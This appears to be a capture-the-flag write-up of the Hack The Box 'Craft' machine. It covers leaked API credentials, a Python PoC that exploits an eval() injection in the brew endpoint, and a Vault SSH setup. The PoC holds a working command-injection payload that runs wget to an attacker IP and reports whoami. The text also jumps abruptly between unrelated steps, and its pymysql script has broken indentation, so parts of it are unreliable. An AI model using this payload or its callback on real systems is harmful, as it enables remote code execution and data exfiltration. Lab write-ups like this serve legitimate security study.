## Initial Access

After enumerating the users, we turn our attention to the only public repository (`Craft-Api`). 
Browsing its commit history, we find that `dinesh` accidentally committed his credentials in `test.py` at some point in the past.

![](/assets/img/HTB-Craft-gogs_old_commit_with_creds.png)

To check whether the credentials are still valid, we write a small Python script that authenticates to the API as `dinesh` and retrieves an authentication token for the API.

```python

import json

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

response = requests.get('https://api.craft.htb/api/auth/login',  auth=('dinesh', '4aXXXXXXXXXxgd'), verify=False)
```

### RCE on API container

With authenticated access to the API, we review the `Craft-Api` source code on Gogs for vulnerabilities. 
The brew creation endpoint `POST /brew/` passes the user supplied `abv` field directly to python's `eval()` function without any sanitisation.

![](/assets/img/HTB-Craft-api_insecure_eval_function.png)

This is dangerous since `eval()` will execute any valid python expression, including OS commands via `__import__('os').system(...)`. 
Since the API does not return command output, we craft an Out-Of-Band (OOB) payload that sends the result of `whoami` as a path component in an HTTP request to our listener. 

Our python script (`PoC.py`) looks like this :

```python
#!/usr/bin/env python

import sys
import requests
import json
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

response = requests.get('https://api.craft.htb/api/auth/login',  auth=('dinesh', '4aXXXXXXXXXxgd'), verify=False)
json_response = json.loads(response.text)
token =  json_response['token']

headers = { 'X-Craft-API-Token': token, 'Content-Type': 'application/json' }

# make sure token is valid
response = requests.get('https://api.craft.htb/api/auth/check', headers=headers, verify=False)
if "Token is valid!" in str(response.text):
    # create a sample brew with real ABV... should succeed.
    print("[+] Create real ABV brew")
    brew_dict = {}
    brew_dict['abv'] = "__import__('os').system('wget http://<ATTACKER_IP>:8000/$(whoami)')"
    brew_dict['name'] = 'bullshit'
    brew_dict['brewer'] = 'bullshit'
    brew_dict['style'] = 'bullshit'

    json_data = json.dumps(brew_dict)
    response = requests.post('https://api.craft.htb/api/brew/', headers=headers, data=json_data, verify=False)
    print(response.text)
else:
    print("Invalid token")
    sys.exit()
```

We start a python HTTP server to receive the out-of-band callback :

```bash

└──╼ [★]$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Running the PoC triggers the payload and the API returns the expected validation error (***"ABV must be a decimal value less than 1.0"***), but the request still reaches `eval()` first :

```python

import pymysql

conn = pymysql.connect(
    host="db",
    user="craft",
    password="qLXXXXXXXXX75O",
    database="craft"    
)

cur = conn.cursor()

    if str(query) == "quit":
        sys.exit(0)
    else:
        cur.execute(query)
        print(cur.fetchall())
```

Looking at the `vault-ssh-helper` configuration file (referenced in the pspy output) tells us how Vault is integrated with the SSH daemon :

```bash
gilfoyle@craft:~$ cat /usr/local/etc/vault-ssh-helper.hcl
vault_addr = "https://172.20.0.2:8200"
ssh_mount_point = "ssh"
tls_skip_verify = true
allowed_roles = "*"
```

`vault-ssh-helper` is a PAM module that intercepts SSH password authentication and validates the supplied password against a Vault-issued OTP. In other words, Vault is acting as a one-time password authority for SSH logins.
To interact with Vault, we export the required environment variables, using the token stored in gilfoyle's `.vault-token` file.

```bash
gilfoyle@craft:~$ export VAULT_TOKEN=$(cat /home/gilfoyle/.vault-token)
gilfoyle@craft:~$ export VAULT_ADDR='https://vault.craft.htb:8200'
gilfoyle@craft:~$ export VAULT_SKIP_VERIFY=true
```
